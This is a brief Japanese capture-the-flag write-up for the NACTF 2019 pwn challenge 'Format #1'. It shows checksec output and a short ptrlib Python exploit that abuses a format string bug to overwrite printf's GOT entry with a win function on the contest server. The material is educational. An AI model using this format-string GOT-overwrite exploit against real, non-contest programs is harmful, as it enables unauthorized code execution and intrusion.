# [pwn 250pts] Format #1 - Network Academia CTF 2019
32ビットバイナリで、全部無効です。
```
$ checksec -f format-1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   72 Symbols     No       0               4       format-1
```

FSBがあるのでGOTを書き換えてwin関数に飛ばします。
```python
from ptrlib import *

elf = ELF("./format-1")
#sock = Process("./format-1")
sock = Socket("shell.2019.nactf.com", 31560)
writes = {elf.got("printf"): elf.symbol("win")}
payload = fsb(
    pos = 4,
    writes = writes,
    bs = 1,
    bits = 32
)
sock.sendlineafter(">", payload)

sock.interactive()
```

# 感想
簡単ですね。
